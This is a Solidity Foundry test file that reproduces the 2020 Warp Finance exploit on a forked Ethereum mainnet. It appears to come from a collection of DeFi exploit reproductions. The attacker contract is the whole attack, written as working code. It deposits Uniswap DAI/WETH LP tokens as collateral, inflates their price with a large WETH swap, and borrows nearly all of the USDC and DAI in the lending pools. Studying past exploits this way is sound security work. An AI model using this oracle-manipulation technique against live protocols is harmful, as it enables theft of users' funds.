// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost: ~$7.8M
// Attack TX: https://etherscan.io/tx/0x8bb8dc5c7c830bac85fa48acad2505e9300a91c3ff239c9517d0cae33b595090
// @Info - Manipulated Uniswap LP pricing allowed undercollateralized borrowing.

interface IWarpCollateralVault {
    function provideCollateral(
        uint256 amount
    ) external;
}

interface IWarpControl {
    function getBorrowLimit(
        address account
    ) external returns (uint256);
    function borrowSC(
        address stablecoin,
        uint256 amount
    ) external;
}

interface IWarpPair is IERC20 {
    function mint(
        address to
    ) external returns (uint256);
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

contract WarpFinanceExploitTest is Test {
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant USDC_TOKEN = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private constant WETH_TOKEN = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address private constant DAI_POOL = 0x6046c3Ab74e6cE761d218B9117d5c63200f4b406;
    address private constant USDC_POOL = 0xae465FD39B519602eE28F062037F7B9c41FDc8cF;

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.public.blastapi.io", 11_473_329);
    }

    function testExploit() public {
        WarpFinanceAttacker attacker = new WarpFinanceAttacker();
        deal(address(DAI), address(attacker), 2_900_029_981_390_875_168_951_633);
        deal(address(WETH_TOKEN), address(attacker), 345_736_685_381_986_552_264_539);
        uint256 daiPoolBefore = DAI.balanceOf(DAI_POOL);
        uint256 usdcPoolBefore = USDC_TOKEN.balanceOf(USDC_POOL);

        attacker.attack();

        assertLt(DAI.balanceOf(DAI_POOL), daiPoolBefore, "DAI pool was not drained");
        assertLt(USDC_TOKEN.balanceOf(USDC_POOL), usdcPoolBefore, "USDC pool was not drained");
    }
}

contract WarpFinanceAttacker {
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant USDC_TOKEN = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private constant WETH_TOKEN = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IWarpPair private constant DAI_WETH_PAIR = IWarpPair(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);
    IWarpCollateralVault private constant COLLATERAL = IWarpCollateralVault(0x13db1CB418573f4c3A2ea36486F0E421bC0D2427);
    IWarpControl private constant WARP = IWarpControl(0xBa539B9a5C2d412Cb10e5770435f362094f9541c);
    address private constant DAI_POOL = 0x6046c3Ab74e6cE761d218B9117d5c63200f4b406;
    address private constant USDC_POOL = 0xae465FD39B519602eE28F062037F7B9c41FDc8cF;

    function attack() external {
        DAI.transfer(address(DAI_WETH_PAIR), 2_900_029_981_390_875_168_951_633);
        WETH_TOKEN.transfer(address(DAI_WETH_PAIR), 4_519_641_165_250_735_182_062);
        DAI_WETH_PAIR.mint(address(this));

        DAI_WETH_PAIR.approve(address(COLLATERAL), type(uint256).max);
        COLLATERAL.provideCollateral(DAI_WETH_PAIR.balanceOf(address(this)));

        WETH_TOKEN.transfer(address(DAI_WETH_PAIR), WETH_TOKEN.balanceOf(address(this)));
        DAI_WETH_PAIR.swap(47_622_330_544_853_730_446_361_677, 0, address(this), "");

        WARP.getBorrowLimit(address(this));
        WARP.borrowSC(address(USDC_TOKEN), USDC_TOKEN.balanceOf(USDC_POOL) - 1);
        WARP.borrowSC(address(DAI), DAI.balanceOf(DAI_POOL) - 1);
    }
}
